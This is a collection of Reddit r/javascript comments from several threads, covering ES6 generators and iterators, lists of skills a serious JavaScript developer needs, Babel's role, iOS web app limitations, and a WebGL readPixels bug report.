A real world use case can be seen in fly/taskr, a build system based on them. It looks something like this: module.exports = { *scripts(task) { yield task.source(`${src}/*.js`).babel({ presets:['es2015'] }).target(`${dist}/js`); }, *build(task) { yield task.parallel(['lint', 'scripts', 'styles']); } } Each task: scripts, build, etc., may contain multiple `yield` statements, each starting async operations. Source: https://github.com/lukeed/taskr
Great article! Congrats
Or even Cycle.js.
True, and I think Apple are seriously foot shooting themselves with this strategy. Android is growing by the minute and Google is embracing the mobile web with progressive web apps and opening up of phone APIs for the browser.
It's not an example for iterators but the future proposal "async iterators": I'm developing an app that displays your YouTube subscriptions. The API only allows to fetch up to 50 subscriptions per request (I still wonder why...). Now I've built an async iterator that "loops" over ajax requests until I got all subscriptions - no matter how much there are. That way I can fetch all subscriptions using the `for await(... of getAllSubs())` loop. And I'm sure that all requests are done when the code below the loop continues running.
that duplication optimization idea is nice, ty for inspiration!
1. Babel / JSX and the "react toolchain" / webpack 2. At least one unit testing framework (Jest / Mocha etc) 3. ES2017 / ES6 coding - incl destructing, spread, rest, arrow functions 4. (nice to have) Functional programming concepts in javascript (Ramda) 5. (nice to have) Observables 6. (nice to have) A CSS Modules system (Styled Components etc) 7. Basic information re: WebAssembly 8. Backwards Compatability / Polyfills and Minimum Browser Requirements 9. Web Security and concepts related to where and how to store sensitive data 10. React Performance optimizations
Redux saga uses Generators
The tutorial seemed to imply that hovering/clicking the circles would give more information, but nothing happens for me. I did get a lot of warnings in the console: `[.Offscreen-For-WebGL-0000000006011750]GL ERROR :GL_INVALID_OPERATION : glReadPixels: format and type incompatible with the current read framebuffer` Apparently that happened so many times, WebGL decided to stop further logging. I also got: HeapSnapshot.js:1576 Heap snapshot: 23814 nodes are unreachable from the root. Following nodes have only weak retainers: s @782323 weak retainers: @1144057.4108 s @782325 weak retainers: @1144057.4426 s @782329 weak retainers: @1144057.542 s @782335 weak retainers: @1144057.4800 s @782337 weak retainers: @1144057.7184 s @782339 weak retainers: @1144057.3138 &lt;snip&gt; Using Chrome 60.0.3112.50
Yeah, because every serious JS developer should know JSX and React. Sure. I think every serious JS developer should have a firm grasp of the language specifics - ES6/7 included. You should also be able to build a web app on your own, without any framework whatsoever.
From the feedback so far, this looks like the way to go. Thanks!
&gt;You should also be able to build a web app on your own, without any framework whatsoever. Wait, you can do that? 
Yes you can, but its lots of work. So you DONT WANT to do it (everytime). But you should BE ABLE to do it if necessary. Which means, you understand your tools. Even frameworks are code.
Good for a data transformation pipeline. Imagine something like data.filter(...).map(...).filter(...).take(10).reduce(...); If you use arrays, each step operates on all of the results of the previous step and returns an intermediate array. But using higher-order functions that expect iterables and return iterators makes it more likely that you'll only do as much work as needed to compute the result, and without any intermediate data structures. See https://github.com/kevinbarabash/functify for example.
1. There's no such thing as a javascript developer.
* ES6/next * knows some funcional patterns * architectural patterns (mvc, event bus, flux, redux, model observers, ...) * tried few frameworks * some experience with tools like webpack, npm, linter, tests * be informed about current trends 
I also recommend Redactor. We use it commercially and it's a huge time save. The only problem was when they were changing their API seemingly every year!
I'm getting this too in both Chrome and FF on Linux.
Easiest example is pagination
1. **Scope.** If you don't understand this *intimately* then you aren't that serious about this language. This is the number one point intentionally and I cannot stress it enough. 2. **Architecture.** You don't have to be a master software architect, but if you cannot perform some basic planning and put pieces together without massive layers of tooling you are an imposter. Expecting frameworks and other tools to simply *do it for you* isn't very impressive. 3. **DOM.** It is very common to see developers hiding from the DOM by layers of abstractions and other stupid crap. querySelectors are great, but are also 2800x slower than the standard DOM methods. That isn't trivial. These methods are super simple, so there is no valid excuse for developers fumbling over this or hiding in fear. http://prettydiff.com/guide/unrelated_dom.xhtml 4. **Node.js** If you are a serious developer should have a pretty solid grasp of how to walk the file system. You should understand how to conveniently read files as text or less conveniently read files as bit for bit binary buffers. 5. **Timing and asynchronous operations**. Events, timers, network requests are all asynchronous and separate from each other and exist both in Node and in the browser. You have to be able to understand how to work with callbacks or promises. 6. **Accessibility**. The interactions imposed by JavaScript can present accessibility barriers. A serious JavaScript developer is already familiar with WCAG 2.0 and knows how to work within its recommendations or when to push back on violating business requirements. 7. **Security.** You need to have at least a basic understanding of security violations, security controls, and privacy. You don't need to be a CISSP, but you need to be able to supply recommendations and avoid obvious failures. If you cannot get this right in the most basic sense you aren't a serious developer. 8. **Data structures.** You need to understand how to organize data in a way that allows the fastest possible execution without compromising maintenance. This is something that is learned through academic study and repeated experience writing applications. 9. **Presentation and semantics.** You really need to have a basic understanding how to properly organize the content your users will consume and how to present in a consumable way efficiently. This is something almost completely learned from experience only. You might think CSS and HTML are simple skills that can be picked up when needed, but you would be absolutely wrong. 10. **Knowing when to avoid the bullshit**. Many developers lack the years of experience to be confident in their performance.... so some of these developers will try to fake it. Don't be an imposter, because everybody will see straight through it. Hoping mountains of abstractions, tooling, frameworks, compilers, and other bullshit will save you just bogs down your application and screws over your teammates. If you aren't confident then be honest about that and seek mentorship or get involved with open source software outside of work.
I'm interested in seeing your list, should you feel so inclined.
Reactive, functional programming is a paradigm not a framework, not knowing what it is and how to use it would be like ignoring mvc and it will seriously impede your options career wise and technically as time goes by. This paradigm is how you will make apps in the web, on mobile and on the desktop, until the next paradigm replaces it, and if one does it will iterate on the functional approach. It only happened to start in the web and React happened to be the framework that kicked it off.
As I can't win the contest as I am not from the US, I will post my solution here to talk with you about it :) function secretArchivesLock(lock, actions) { return actions.split('').reduce(transform, lock) } const transformsByAction = { R: state =&gt; state.map(shiftRight), D: state =&gt; transpose(transpose(state).map(shiftRight)), L: state =&gt; state.map(shiftLeft), U: state =&gt; transpose(transpose(state).map(shiftLeft)), } function transform(state, action) { return transformsByAction[action](state); } function transpose(state) { return state[0].split('').map((character, i) =&gt; state.map(row =&gt; row[i]).join('')) } function shiftRight(string) { const withoutDots = string.replace(/\./g, '') return withoutDots.padStart(string.length, '.') } function shiftLeft(string) { const withoutDots = string.replace(/\./g, '') return withoutDots.padEnd(string.length, '.') }
and who use google+ this days ? that's weird
1 - 10) Stay off reddit. Never come here for advice. Learn from books and good online sources or mentors instead. EDIT: That said, I just saw /u/achen2345 list and it's excellent.
I'm ignoring your advice, it's from Reddit.
Right now, for getting a JS developer based Role, I would put React on the list of potentially required skills - you can of course add in Angular, or any other widely used framework, but based on the job market (and this is what I believe the original thread was focused at) - React has to be on the list.
&gt; years of experience For someone with the propensity and dedication how many years would that be?
Which is a typical dumbass redditor comment.
I thought Javascript was just a framework creation tool? I am very confused.
This is pretty close well right on the money. All the other threads about ES6, React and ASM are way off. Sure, ES6 adds some great features but the entire Babel toolchain is temporary by its very nature. Some serious projects may yet not use it and that's fine. ES6 won't save you if you don't understand scope or architecture. As for ASM and React, sounds a bit like a No True Scotsman fallacy. To be serious, we should know your flavor of the month? To elaborate on the point about scope and architecture, you HAVE to know your design patterns in JS. There's no way around it. You must know [Pub/Sub](https://davidwalsh.name/pubsub-javascript), [Revealing Module Pattern](https://addyosmani.com/resources/essentialjsdesignpatterns/book/#revealingmodulepatternjavascript), [Currying](https://medium.com/@kbrainwave/currying-in-javascript-ce6da2d324fe) and others. You really should know how to hand-roll a [Tightly Augmenting Module Pattern](http://www.adequatelygood.com/JavaScript-Module-Pattern-In-Depth.html) across multiple files. (it's how your favorite frameworks handle their DI magic). Understanding the mechanics of these types of patterns and how/when to use them sets you apart from non-serious developers.
For anyone interested, an update was pushed to fix all the UI/scrollbar issues reported here. Link: https://github.com/jaredreich/pell/commit/722308c16bd539bdb023f6074b4389f8e0397b81
This answer feels like the only good one. Most the others are literally saying "learn XX tool" and "stay up on trends" LOL.
Honestly, I do not think WYSIWYG needs to be solved. It's much more important that the content created is well-formed and semantic. Especially in an era of responsive design, the less "crap" user-created content contains. The easier for everyone it is to make it look good on any device. 
Wait, I think you mix up React and reactive programming. React is **not** a reactive library. A library for reactive programming would be RxJS. A view library based on that paradigm would be CycleJS. Just for clarification. :)
For all that you shit on "redditors", you are the most stereotypical "redditor" I've seen in awhile.
TIL about document.execCommand, awesome library good work!
This isn't /r/programmingcirclejerk, we're in /r/javascript.
[removed]
Regards the DOM, whilst the differences I'm seeing aren't that drastic I am surprised to see how much worse the performance of `querySelector[All]` is. That said, if you're querying that many DOM nodes today then you're probably better off using something like React anyway. Edit: Also, unbeknownst to me, these methods don't actually behave the same anyway (static vs live representation): http://ryanmorr.com/abstract-away-the-performance-faults-of-queryselectorall/ Regards accessibility, whilst I want to agree with you, my experience in 3 different jobs (1 design focused, 2 business/logic/usefulness focused) has taught me otherwise. People really don't care much about accessibility unfortunately.
It could be in a number of ways if you didn't have to design around iOS.
No. I am far from anything a typical redditor is.
&gt; Which is a typical dumbass redditor comment. 
ServiceWorker which is necessary for a lot of app-like behaviour, the ability to use the bottom of the screen, fullscreen API, inability to return to a homescreen app without it restarting. I see getUserMedia has *finally* appeared in iOS 11, I suppose we should be grateful for that.
Same problem if you install a shitty native app.
Don't worry... *ALL* of this content will make it over to PCJ in the next couple of hours... 
I'm super proud of the work done by the entire GraphQL community to make getting started with GraphQL much easier. If you are curious about GraphQL but never really had the time to dig deeper, this new resource is a great excuse to do so :-D There are separate tracks for most frontend and backend technologies, so you can pick where you want to start.
Sorry... got carried away
&gt; Learn from books and good online sources or mentors instead Honestly, assuming that I haven't considered or participated in this is is beyond condescending. 
&gt; (...) the entire Babel toolchain is temporary by its very nature. No. As long as ECMAScript is actively developed on, Babel serves a purpose. Babel doesn't transpile ES6 to ES5 but future proposals and new final features to code that's interpreted by most widely used browsers at the given time. That's why it was renamed to Babel after all. If I didn't get your point please let me know.
React isn't a framework, really. It's a library that handles one concern, not enough to build a whole app alone. I'd say it's definitely something you should know about as a JS developer.
Thanks for spending time and explaining this! Awesome!
Plagiarism https://www.reddit.com/r/javascript/comments/4x2tha/12_extremely_useful_hacks_for_javascript/
I prefer vue over react and since i’m now in a dev role where i approve new dev hires i’m okay if they don’t know react but can prove they have some familiarity with literally anything similar. when did we as a community stop accepting breadth and instead become so narrow minded. if someone can write good code and utilize angular/vue/backbone/fucking-anything then it follows that they can be capable of learning react on the job. p.s. - this isn’t a criticism aimed at you, you’re just who i chose to respond to.
This is a brilliant list - it even includes things like accessibility and semantics which **far** too few front-end/JS devs understand these days, mistakenly conceptualising front-end development as synonymous with "javascript programming", which is laughably inaccurate and incomplete. It's also worth noting that **not one of these bullet points involves a specific tool, library or framework**. This is not an accident, and demonstrates that the author knows *exactly* what he's talking about.
As a developer you want more control over people's phone. That's clear. But I'm also thinking as a user, and the only thing I can think of when reading most of this list of features is "WTF, keep your hands off my phone". Apple is driven by user experience, not by developer experience. So don't expect them to give any site out there the ability to go full-screen and run background processes. Frankly sounds like this will only be abused, just like site push notifications today are only abused. The native app equivalents of those features are more power efficient, more flexible, and you can take advantage of them today. And apps are at least a little vetted, unlike the random sites you'll encounter on the wild wild web out there, so things can be kept in check somewhat. The browser *should not take over* people's devices.
I think the priorities are wrong in that list and its missing nodejs
Maybe you just shouldnt code with Babel, its edge enough to cut you.
As a user I'd *really* prefer not to need to install a native app. I'd rather have it run in the browser sandbox.
when the console return an object between brackets [], it means it is an array. you should: document.querySelectorAll(".guidance")[0].innerHTML maybe before, you didnt' use querySelectorAll (which returns an Array) but simply querySelector which returns the first element found.
If I may argue with you while agreeing with you... Instead of: let it = tree.iterator(); it.next(); We can decouple traversing the data structure from the data structure: function depthFirst(tree) { ... } function breadthFirst(tree) { ... } let iterable = depthFirst(treeOfSomeKind); for (const leaf of iterable) { // ... } Now we have separated responsibilities even further: We have a data structure (not shown) that is presumably responsible for maintaing itself, some functions that have the single responsibility of generating an iterable from a data structure, and a piece of code that has the single responsibility of iterating over the data and doing something with it. (if you really love "Kingdom of Nouns" programming, we could give a tree multiple methods for generating iterables, or even use the Strategy pattern). I think that if we absolutely, positively insist that a data structure know how to do a default iteration over itself, then we can drop `.iterator()` as a method and go straight to `[Symbol.iterator]()`, which gives us: for (const leaf of tree) { // ... } No need to extract an iterator by hand. --- Anyways, the point is that iterators and iterables separate what we want to do with a data structure from how to traverse the data structure, *especially* if we embrace ES6 iterables and syntactic sugar like the `for... of` loop. 
After writing my comment I noticed a mistake: Babel doesn't transpile anything. It's fueled by plugins. So it can even be used to transpile JSX or TypeScript or whatever the future might bring. There also are plugins for minification. So I wouldn't be surprised if there are some that do performance optimization and what not. So it's extremely versatile.
It isn't so much the number of nodes you are querying, as in the size of the returned node list. More relevant factors would be the complexity of the query selector, the size of the document (number of DOM nodes), and number of times a query is executed. That last item is by far the most important as it compounds all other performance metrics. Essentially the query selectors are the standard DOM methods under an instruction that requires a separate parse step. Surprisingly the query selectors can perform faster in edge cases where the DOM methods aren't optimized. The one edge case I have found is that query selectors are about 16x faster when searching by attribute name or value if that attribute name is not *id* or *class*. There are likely other edge cases that I am unaware of. --- Accessibility, when done properly, tends to be benefit everybody. The two classic real world examples are handicap parking spaces in the parking lot and wheel chair ramps at the airport. Wheelchair ramps were first implemented in the US at airports due to a change in law, and once implemented, became frequently used in unexpected ways from people with child strollers, temporary injuries, or people who simply had a different preference. The counter example is too many handicapped parking spots in the parking lot when the parking lot fills up leaving an excess of special parking spaces unused to the detriment of everybody else. The majority of accessibility comes simply from writing HTML properly and not breaking it with JavaScript. The benefits to accessible code benefit everybody. This includes more informative form controls, areas of the page arranged in a predictable way, and interactions that limit added frustration. It is my experience that business doesn't see the value of accessibility, generally an unnecessary cost burden, because they aren't that familiar with accessibility to begin with. They know only what they can see, so to speak, instead of what they could get from communicating a clearer emphasis of usability to the user (which is content first and interaction second). Additionally, accessibility can only be properly applied, in a business, when it is driven by business leadership. Otherwise accessibility becomes a best wish scenario where it is forced on the developer and not validated, appreciated, or factored into estimates by anybody else. When accessibility is valued by the business leadership then everybody becomes aware of what generally qualifies as an accessibility failure and it becomes a basic component of content and interaction. Accessibility becomes intertwined with production quality. The user gets a better product and internal processes get more efficient at accounting for product quality at all levels. I have seen how accessibility plays from experience in organizations that don't care, claim they want it, and actually impose it as a business priority.
There are only two from me: * **patience** to read/listen about new silver bullet framework/library/tool/whatever * know **how to implement** left-pad
&gt; when the console return an object between brackets [], it means it is an array. Ah right, forgot about that. That explains why it has so many properties when I expand it :-) &gt;&gt; maybe before, you didnt' use querySelectorAll (which returns an Array) but simply querySelector which returns the first element found. Actually not exactly. When I used it before, I see now that I included the particular array element after querySelectorAll. In this case I was neglecting to do so. I changed my selector to querySelector in this case and I now am able to select its outerHTML. I think that should suffice--thanks!
this could be quite helpful for automating the initial mechanical work needed to migrate from php to node
I think this nails it.
&gt; but the entire Babel toolchain is temporary by its very nature That's a misunderstanding of the value of Babel. Being able to translate ES6+ to ES5, that is probably temporary (while the language is still evolving, you don't always need the latest and greatest RIGHT NOW NOW NOW, so you can do away with compiling depending on target browsers). But Babel is so much more than that. It lets you easily optimize, instrument and modify your generated code with simple (relatively speaking) plugins. For example, it's fairly common to use Babel to do something special with invariant error handling. We use it to do special stuff with ES6 imports before passing them over to Webpack. If you extend the "entire babel toolchain" to include Babylon, then you have code mods, static code analysis and all that stuff, which is invaluable.
you'd want to convert the ip to int first: https://stackoverflow.com/questions/8105629/ip-addresses-stored-as-int-results-in-overflow/23589224#23589224 then use AND (`&amp;`) with a 24bit mask to check it. there are already libs for this if you seach. eg https://github.com/franksrevenge/IPSubnetCalculator and http://www-personal.umich.edu/~parsec/information/code/ip_calc.html
It is hard to say. I took an unusual path to learning these technologies. I started writing HTML as a side hobby 20 years ago when everybody butchered that code for presentation and there was only one browser, IE4. Later IE6 would command up to 97% browser marketshare. Netscape still had strong marketshare at that time, but the IE browser was better, unless you were heavily coding in JavaScript (which almost nobody was). Also keep in mind there was no standard for interacting with the document. In 2006 I learned CSS. Firefox had been around for a few years, but this is the year it really gained significant enough marketshare to be worth anything. Learning CSS at this time was the school of hard knocks because IE6 was the most popular browser, but featured a non-standard box model. You had to account for both browsers in a seamless way and it was hard. Further more people were falling over themselves for stupid things like rounded corners, which had to be done with images and were also hard to get right cross browser. I know everybody would cry about IE and how hard working with IE9 was. Really though, this was completely trivial. IE9 was simple to work with. In 2007 I taught myself XML and XML Schema. JSON was invented in 2006, but it wasn't well known then. The AJAX term first appeared in 2006 and the interest in XML exploded as many businesses at the time were already invested in XML for various technology reasons. In learning XML Schema I learned how lexical scope works and a lot about semantics, relationships, and data representation. Everything I learned from XML I have been able to apply to JavaScript very directly. In late 2007 I was involuntarily reassigned at the job from being a designer to a front-end developer and was forced to learn JavaScript in order to retain my job. JavaScript wasn't popular yet, everything was very slow, and the technologies were littered with pitfalls. At least by this point standards were a big deal and everything worked uniformly cross-browser. You had to learn to code very defensively and you just learned what things executed faster than others. Google Chrome wasn't even a thing until around the fall of 2008.
I've only seen it complicate shit in the field. Its highly misused and needed to fix problems which shouldn't exist.
This mentor stuff is bs. Virtually no one is willing to dedicate significant time into your professional development. 
Is left pad a joke or..?
This isnt running PHP in the browser. It's running a quasi-JS runtime with PHP syntax. To run "PHP in the browser" you'd need tests passing on all the major php frameworks, as per, Hack's testsuit. Otherwise you're forcing people to learn some language not quite either JS or PHP.
yeah ;)
He probably means be able to write a left-pad yourself, rather than relying on a third party.
I don't think it's trying to run PHP in the browser in terms of taking something written to be a server but it will allow you to write PHP with the browser in mind and transpile it to working JS code.
I've been full stack for 20+ years in web dev, including my current job where I work on an app where people upload and download files, and I can't say that reading files from the file system is something I've needed for more than a week of that career. The code to read, modify, delete, chunk, stream, etc. is important for the apps that need it, for sure, but you skipped over *database access* or even *web services* for file operations? Most apps talk to a database or service. Surprisingly few of them talk to a file system directly; there are great libraries and frameworks in every language for almost every read/write operation you might want. Any more than that is a task for a specialist, not a generalist. Accessibility is a really nice addition here. But many companies don't even begin to consider this a priority unless they -have to-, which means it becomes a nice-to-have (and how often do we get to those?) I would strongly prefer Internationalization over Accessibility, if I had to pick one; even if your app is english-only right now the future pain is worth the extra time. Security is important, but best left to the experts. Get your app reviewed by the experts, and fix the issues they identify - otherwise you're left with a false sense of security from your in-house "expert" on security - who once read about SQL injection and thinks you're fine because you have parameterized queries. This is definitely a task for the specialists and not generalists.
Hmm, thanks for the report. The weak retainers output is normal and expected. The GL_INVALID_OPERATION, not so much. I'm using glReadPixels to look up which node you're hovering over by cross-referencing it to a hidden, color-coded canvas. I've been developing on Chrome 59 though, so it's possible there is an API shift in 60. Thanks for the report and I appreciate you checking it out. I'll update when I know more. EDIT: Found the issue - it looks like readPixels in Chrome 60 and FF does not support a "type" of RGB (which is a shame, I don't need the alpha data and also contradicts the documentation). I'm unclear whether this is a WebGL bug or not, but I'm updating my code to use gl.RGBA instead.